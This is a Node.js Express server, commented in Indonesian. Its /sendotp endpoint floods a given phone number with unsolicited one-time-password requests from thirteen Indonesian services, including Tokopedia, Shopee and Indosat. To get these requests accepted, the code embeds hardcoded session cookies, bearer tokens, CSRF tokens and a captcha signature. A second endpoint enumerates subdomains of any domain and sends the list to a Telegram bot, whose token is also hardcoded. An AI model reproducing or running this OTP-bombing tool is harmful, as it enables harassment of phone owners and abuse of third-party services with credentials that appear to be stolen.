const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = "8419027805:AAFwqpHo_m8OCQO2xxJRcxNuWb42ZgPi0iQ";

app.use(express.json());

// Logger sederhana
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// ==========================================
// ENDPOINT SUBDOMAIN (BARU!)
// ==========================================
app.get('/subdomain', async (req, res) => {
  const domain = req.query.finder;
  const userId = req.query.userid;
  const groupId = req.query.grupid;
  
  if (!domain) {
    return res.status(400).json({ 
      status: 'error', 
      message: 'Parameter finder diperlukan. Contoh: /subdomain?finder=komdigi.go.id&userid=123' 
    });
  }
  
  if (!userId && !groupId) {
    return res.status(400).json({ 
      status: 'error', 
      message: 'Parameter userid atau grupid diperlukan' 
    });
  }
  
  console.log(`🔍 Menerima permintaan subdomain untuk: ${domain}`);
  console.log(`👤 Target: ${groupId ? 'Grup ' + groupId : 'User ' + userId}`);
  
  // Langsung response biar ga timeout
  res.json({ 
    status: 'processing', 
    message: 'Mencari subdomain di background',
    domain: domain,
    target: groupId || userId
  });
  
  // Proses di background
  (async () => {
    await cariSubdomainDanKirim(domain, userId, groupId);
  })();
});

// ==========================================
// ENDPOUT OTP (YANG UDAH ADA)
// ==========================================
app.get('/sendotp', async (req, res) => {
  const nomor = req.query.phone;
  
  if (!nomor) {
    return res.status(400).json({ 
      status: 'error', 
      message: 'Parameter phone diperlukan. Contoh: /sendotp?phone=628123456789' 
    });
  }
  
  console.log(`📱 Menerima permintaan OTP untuk nomor: ${nomor}`);
  
  // Langsung kirim response biar gak timeout
  res.json({ 
    status: 'processing', 
    message: 'OTP sedang diproses di background',
    nomor: nomor
  });
  
  // Proses di background
  (async () => {
    await kirimOtpSemua(nomor);
  })();
});

// Endpoint buat cek status
app.get('/status', (req, res) => {
  res.json({ 
    status: 'online', 
    message: 'Server OTP + Subdomain Railway siap digunakan',
    timestamp: new Date().toISOString()
  });
});

// Health check
app.get('/', (req, res) => {
  res.send('🚀 Server OTP + Subdomain Railway siap digunakan!');
});

// ==========================================
// FUNGSI SUBDOMAIN
// ==========================================
async function cariSubdomainDanKirim(domain, userId, groupId) {
  console.log(`🚀 Mencari subdomain untuk ${domain}...`);
  
  try {
    const apiUrl = `https://api.danzy.web.id/api/search/subdomain?url=${encodeURIComponent(domain)}`;
    console.log(`📡 Memanggil API: ${apiUrl}`);
    
    const response = await fetch(apiUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    
    if (!response.ok) {
      throw new Error(`API error: ${response.status}`);
    }
    
    const data = await response.json();
    
    if (!data.status || !data.result || data.result.length === 0) {
      throw new Error('Tidak ada subdomain ditemukan');
    }
    
    const subdomains = data.result;
    const total = data.count || subdomains.length;
    
    console.log(`✅ Ditemukan ${total} subdomain untuk ${domain}`);
    
    // Tentukan target chat
    const chatId = groupId || userId;
    
    // Siapkan pesan
    let message = `🔍 *SUBDOMAIN FINDER*\n\n`;
    message += `🌐 Domain: \`${domain}\`\n`;
    message += `📊 Total: ${total} subdomain\n`;
    message += `━━━━━━━━━━━━━━━━━━\n\n`;
    
    const maxShow = 30;
    const showSubs = subdomains.slice(0, maxShow);
    
    showSubs.forEach((sub, index) => {
      message += `${index + 1}. \`${sub}\`\n`;
    });
    
    if (subdomains.length > maxShow) {
      message += `\n... dan ${subdomains.length - maxShow} subdomain lainnya.\n`;
    }
    
    message += `\n━━━━━━━━━━━━━━━━━━\n`;
    message += `🔍 by Yanshs`;
    
    // Kirim ke Telegram
    await kirimKeTelegram(message, chatId);
    
    // Kirim file kalo terlalu panjang
    if (message.length > 4000) {
      await kirimFileKeTelegram(subdomains, domain, chatId);
    }
    
  } catch (error) {
    console.error(`❌ Error: ${error.message}`);
    const chatId = groupId || userId;
    if (chatId) {
      await kirimKeTelegram(`❌ Gagal mencari subdomain untuk ${domain}: ${error.message}`, chatId);
    }
  }
}

// Fungsi kirim pesan ke Telegram
async function kirimKeTelegram(teks, chatId) {
  if (!chatId) return;
  
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: teks,
        parse_mode: 'Markdown'
      })
    });
    console.log(`✅ Pesan terkirim ke ${chatId}`);
  } catch (e) {
    console.log(`❌ Gagal kirim pesan: ${e.message}`);
  }
}

// Fungsi kirim file ke Telegram
async function kirimFileKeTelegram(subdomains, domain, chatId) {
  if (!chatId) return;
  
  try {
    const content = subdomains.join('\n');
    const fileName = `subdomains_${domain.replace(/\./g, '_')}_${Date.now()}.txt`;
    
    // Pake form-data (perlu install)
    const FormData = require('form-data');
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('document', Buffer.from(content), { filename: fileName });
    formData.append('caption', `🔍 Subdomain untuk ${domain} (${subdomains.length})`);
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formData
    });
    
    console.log(`✅ File terkirim ke ${chatId}`);
  } catch (e) {
    console.log(`❌ Gagal kirim file: ${e.message}`);
  }
}

// ==========================================
// FUNGSI OTP (LENGKAP - GA DIUBAH)
// ==========================================
async function kirimOtpSemua(nomor) {
  console.log(`🚀 Memulai proses OTP untuk ${nomor}`);
  
  // Format nomor
  let nomor_62 = "", nomor_plus = "", nomor_0 = "", nomor_882 = "", nomor_shopee = "", nomor_hash = "";
  
  nomor = nomor.replace(/[^0-9]/g, '');
  
  if (nomor.startsWith('62')) {
    nomor_62 = nomor;
    nomor_plus = "+" + nomor;
    nomor_0 = "0" + nomor.substring(2);
    nomor_882 = nomor.substring(2);
    nomor_shopee = nomor;
  } else if (nomor.startsWith('08') || nomor.startsWith('8')) {
    if (nomor.startsWith('8') && nomor.length === 11) {
      nomor_0 = "0" + nomor;
      nomor_62 = "62" + nomor;
    } else {
      nomor_0 = nomor;
      nomor_62 = "62" + nomor.substring(1);
    }
    nomor_plus = "+" + nomor_62;
    nomor_882 = nomor_62.substring(2);
    nomor_shopee = nomor_62;
  }
  
  const crypto = require('crypto');
  nomor_hash = crypto.createHash('md5').update(nomor_62).digest('hex').substring(0, 26);
  
  console.log(`📊 Format nomor: 62=${nomor_62}, +62=${nomor_plus}, 0=${nomor_0}`);
  
  let hasil = [];
  let sukses = 0;
  let gagal = 0;
  
  // 1. TOKOPEDIA
  try {
    console.log('🔄 Tokopedia...');
    const tokpedRes = await fetch("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=" + nomor_62 + "&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D%7B%7D%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const html = await tokpedRes.text();
    const tokenMatch = html.match(/id="Token" value="([^"]+)"/);
    
    if (tokenMatch && tokenMatch[1]) {
      const token = tokenMatch[1];
      const waRes = await fetch("https://accounts.tokopedia.com/otp/c/ajax/request-wa", {
        method: "POST",
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0' },
        body: "otp_type=116&msisdn=" + nomor_62 + "&tk=" + token + "&email=&original_param=&user_id=&signature=&number_otp_digit=6"
      });
      const waText = await waRes.text();
      if (waText.includes("success")) {
        hasil.push('✅ Tokopedia: Berhasil');
        sukses++;
      } else {
        hasil.push('❌ Tokopedia: Gagal');
        gagal++;
      }
    } else {
      hasil.push('❌ Tokopedia: Gagal ambil token');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Tokopedia: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 2. DUNIAGAMES
  try {
    console.log('🔄 Duniagames...');
    const deviceId = crypto.randomUUID() || "2f252902-8b3d-4751-ac82-25bf614f912d";
    const dgRes = await fetch("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", {
      method: "POST",
      headers: {
        'Ciam-Type': 'FR',
        'Accept-Language': 'id',
        'X-Device': deviceId,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      body: JSON.stringify({ phoneNumber: nomor_plus, userName: nomor_0 })
    });
    const dgText = await dgRes.text();
    if (dgText.includes("success") || dgText.includes("otp")) {
      hasil.push('✅ Duniagames: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ Duniagames: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Duniagames: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 3. SIMASWANGI
  try {
    console.log('🔄 Simaswangi...');
    const randomName = "user" + Math.floor(Math.random() * 9000 + 1000);
    const smRes = await fetch("https://chat.simaswangi.biz.id/send-otp", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: randomName, phone: nomor_0 })
    });
    const smText = await smRes.text();
    if (smText.includes("success") || smText.includes("otp")) {
      hasil.push('✅ Simaswangi: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ Simaswangi: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Simaswangi: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 4. INDOSAT
  try {
    console.log('🔄 Indosat...');
    const im3Res = await fetch("https://myim3api1.ioh.co.id/api/v2/otp/send/web", {
      method: "POST",
      headers: {
        'Authorization': '642d1cc69d90666962726e',
        'X-Imi-Uid': '20261122143439197833',
        'X-Imi-Trackid': 'e925fe19391eb69a5f57410db449',
        'X-Imi-Tokenid': '17717456791973',
        'Content-Type': 'application/json',
        'X-Imi-Oauth': '8322cd6ef9f8afa3c935f7aa408da08963716b07bb913c78fd5645e9ea671baa4ffb7e2be94136684e60a3d28f99d04105ee10fff5621f62ee8cd46520ce28d7'
      },
      body: JSON.stringify({ msisdn: nomor_hash, action: "register" })
    });
    const im3Text = await im3Res.text();
    if (im3Text.includes("code was sent") || im3Text.includes("success")) {
      hasil.push('✅ Indosat: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ Indosat: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Indosat: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 5. PIDAW
  try {
    console.log('🔄 PIDAW...');
    const xRequestId = crypto.randomUUID() || "2ece7695-cc7e-4600-b8cc-479541b606cf";
    const pidawRes = await fetch("https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp", {
      method: "POST",
      headers: {
        'X-Request-Id': xRequestId,
        'X-Deviceid': '1771815909754959968899',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ identifier: nomor_882, channel: "web" })
    });
    const pidawText = await pidawRes.text();
    if (pidawText.includes("success") || pidawText.includes("otp")) {
      hasil.push('✅ PIDAW: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ PIDAW: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ PIDAW: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 6. PLASGOS
  try {
    console.log('🔄 Plasgos...');
    const plasgosRes = await fetch("https://server-plasgos.herokuapp.com/v3.1/register/otp/request/phone", {
      method: "POST",
      headers: {
        'Time-Zone': 'Asia/Jakarta',
        'Fingerprint': '9a5edd5d3569ea17664af66d2be29d67',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ phone_number: nomor_0 })
    });
    const plasgosText = await plasgosRes.text();
    if (plasgosText.includes("success") || plasgosText.includes("otp")) {
      hasil.push('✅ Plasgos: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ Plasgos: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Plasgos: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 7. MUDAH INDONESIA
  try {
    console.log('🔄 Mudah Indonesia...');
    const mudahRes = await fetch("https://pintu.mudahindonesia.com/teras/v1/auth/register", {
      method: "POST",
      headers: {
        'Cookie': 'access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVkQXQiOiIyMDI2LTAyLTIzVDA5OjM2OjExLjYyMzQ5OTY0M1oiLCJ1c2VyVXVpZCI6ImUwYzIxZDgyLTY3MGQtNGE1NS1hODY0LWEyMjdjNmFlMzgxZSIsInVzZXJWZXJpZmljYXRpb25TdGF0dXMiOiJiYXNpYyJ9.B7CSy5AScasdh9z1Og8slk_JzAiJBfo8zm8E3aokNLY; refresh_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVkQXQiOiIyMDI2LTAyLTI2VDAzOjM2OjExLjYyMzU0MTg3NFoiLCJ1c2VyVXVpZCI6ImUwYzIxZDgyLTY3MGQtNGE1NS1hODY0LWEyMjdjNmFlMzgxZSIsInVzZXJWZXJpZmljYXRpb25TdGF0dXMiOiJiYXNpYyJ9.q6G567GHud_UQzWBn8H8B5h-JuDJqmk9PecyH6YKrtY',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 
        phone_number: nomor_plus, 
        business_name: "bisnis" + Math.floor(Math.random() * 900 + 100), 
        otp_channel: "sms" 
      })
    });
    const mudahText = await mudahRes.text();
    if (mudahText.includes("success") || mudahText.includes("otp")) {
      hasil.push('✅ Mudah Indonesia: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ Mudah Indonesia: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Mudah Indonesia: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 8. KASIR PINTAR
  try {
    console.log('🔄 Kasir Pintar...');
    const randomEmail = "user" + Math.floor(Math.random() * 9000 + 1000) + "@gmail.com";
    const kasirRes = await fetch("https://kasirpintar.co.id/requestOTPWA", {
      method: "POST",
      headers: {
        'X-Csrf-Token': '7uhZ1kKardpACPWve1wFmBcqrdsv1Vat3N2iHdd0',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: "no_hp=%2B" + nomor_62 + "&email=" + randomEmail
    });
    const kasirText = await kasirRes.text();
    if (kasirText.includes("success") || kasirText.includes("otp")) {
      hasil.push('✅ Kasir Pintar: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ Kasir Pintar: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ Kasir Pintar: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 9. INDODAX
  try {
    console.log('🔄 INDODAX...');
    const randomEmail2 = "user" + Math.floor(Math.random() * 9000 + 1000) + "@gmail.com";
    const indodaxRes = await fetch("https://api.indodax.com/api/v1/otp/send", {
      method: "POST",
      headers: {
        'Authorization': 'Bearer KcMooTUEVo',
        'Key': 'KcMooTUEVo',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ 
        method: "whatsapp", 
        flow: "register", 
        old_uuid: "", 
        email: randomEmail2 
      })
    });
    const indodaxText = await indodaxRes.text();
    if (indodaxText.includes("is_success\":true") || indodaxText.includes("otp_sent")) {
      hasil.push('✅ INDODAX: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ INDODAX: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ INDODAX: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 10. SHOPEE
  try {
    console.log('🔄 SHOPEE...');
    const csrfToken = "Le2rYCySbCwvqoFQGIhJotRGpaJY8ROx";
    const captchaSig = "098b54f4c92a51adcb68e8fe68adec23299a069e95dbcffca3ca8b5cd54f040fc24d16994954ae73862a3dfb8ccd79aa802b85e9d58864935b32cc793a7b804513ce70f470e6a1cda60e61851b2ef070556c6244abb886524f3842df810012eee061a1f1cae4ed51d55e5d69e51cbae632d9c1333ee71c234f4030b88fd6107939e11d935d4762fd76c34f70454034aaa56014f65d156cb1146bb48f08506147b186d57a6e18882f88fa5a1535dbfbba3ef3d27a07b67f63df8109f688694617609821651d8080be56a89a8fcc75b2d5398904db4dffb03788b649bbf20c3c1fa6415c9093d48cafacaa3e1353222ac8a7b7b8db62b2d540cb48e2295c5e63ab042d1e87ea78bd148800147bf2832c37bfd70f8135b483931e25e27567a5eb33eaa3e351eb3d3126c14f6473bc8255eed74f1919ff548a1ffbd8af20996083160cbbd355319f262ffbb3fe8cb027eb3eb51b3daaf490895e6b12eb0c88374852c49590ee917e2b283637473d128a12c717740dc03ed9f04750701012946e5896bb88f4dbf9c37f2dbdd68a363342a385dd5197bb8d6e7f83a96882b7f43f8b05da387282bf43f5e6f98cc265a196c8141a13b7661c096436c2ecad0765e141c1a495cb90c43c21c0ed1679422f8a116c60cfc75c48866f7d59295895f6c54d5cabbf79b872b794db7229b07aef9b92ac5f25ee47b4b9af0ae9599fb984ed345d830cede6833c962f358d65eda04433ebf366033ff71ccca232252c18b7aedac74c0070ce215f4fdf091b40aecbde65e0fd917640e842b311b1e8f6d27ebe8183c637c33f438580477ed5f32a142f39a2d4e46e8ac5530410c37d87";
    
    const shopeeRes = await fetch("https://shopee.co.id/api/v4/otp/send_vcode", {
      method: "POST",
      headers: {
        'X-Csrftoken': csrfToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        phone: nomor_shopee,
        force_channel: true,
        m_token: "",
        captcha_signature: captchaSig,
        operation: 8,
        channel: 3,
        supported_channels: [1,2,3,6,0,5],
        support_session: true,
        client_identifier: { security_device_fingerprint: "tun7TkSDv0dWNXv6Vz/bfg==|oFIaKS1no9ihWN+Ryg+D50+YjFtT1c7dxuddGtAh6V8uHpARf4oMUCSSLsoYzmfkl5n3htccARpZ5w==|giVXuDMHiwUsRo2L|08|3" }
      })
    });
    const shopeeText = await shopeeRes.text();
    if (shopeeText.includes("error") && !shopeeText.includes("23500101")) {
      hasil.push('❌ SHOPEE: Gagal');
      gagal++;
    } else {
      hasil.push('✅ SHOPEE: Berhasil (error 23500101 = sukses)');
      sukses++;
    }
  } catch (e) {
    hasil.push('❌ SHOPEE: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 11. SOCO
  try {
    console.log('🔄 SOCO...');
    const socoRes = await fetch("https://login.soco.id/api/otp/request", {
      method: "POST",
      headers: {
        'Soc-Platform': 'sociolla-web-mobile',
        'Authorization': 'Bearer ab951853b2d6655ad26a5c4bc4d728cffc3030177090a5cdb748772df46dae3c',
        'Session_id': '2501abd3-9372-4fd7-821e-97f84b23c211',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ method: "whatsapp" })
    });
    const socoText = await socoRes.text();
    if (socoText.includes("success") || socoText.includes("otp")) {
      hasil.push('✅ SOCO: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ SOCO: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ SOCO: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 12. SICEPAT
  try {
    console.log('🔄 SICEPAT...');
    const sicepatRes = await fetch("https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/" + nomor_62 + "?sms=false", {
      headers: { 'X-Recaptcha': 'bdb17986:e12d26ffefe5685' }
    });
    const sicepatText = await sicepatRes.text();
    if (sicepatText.includes("success") || sicepatText.includes("otp") || sicepatText.includes("sent")) {
      hasil.push('✅ SICEPAT: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ SICEPAT: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ SICEPAT: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // 13. RUMAH123
  try {
    console.log('🔄 RUMAH123...');
    const rumahRes = await fetch("https://www.rumah123.com/api/otp/request-otp", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json;charset=UTF-8',
        'Base-Url-Core': 'https://www.rumah123.com'
      },
      body: JSON.stringify({ phoneNumber: nomor_62, portalId: 1, type: "WHATSAPP" })
    });
    const rumahText = await rumahRes.text();
    if (rumahText.includes("success") || rumahText.includes("otp")) {
      hasil.push('✅ RUMAH123: Berhasil');
      sukses++;
    } else {
      hasil.push('❌ RUMAH123: Gagal');
      gagal++;
    }
  } catch (e) {
    hasil.push('❌ RUMAH123: Error - ' + e.message.substring(0, 50));
    gagal++;
  }
  
  // LOG HASIL
  console.log('\n' + '='.repeat(50));
  console.log(`📱 HASIL OTP UNTUK ${nomor}`);
  console.log('='.repeat(50));
  console.log(`✅ Sukses: ${sukses}`);
  console.log(`❌ Gagal: ${gagal}`);
  console.log('='.repeat(50));
  hasil.forEach(h => console.log(h));
  console.log('='.repeat(50));
}

// ==========================================
// JALANKAN SERVER
// ==========================================
app.listen(PORT, () => {
  console.log(`✅ Server OTP + Subdomain berjalan di port ${PORT}`);
});
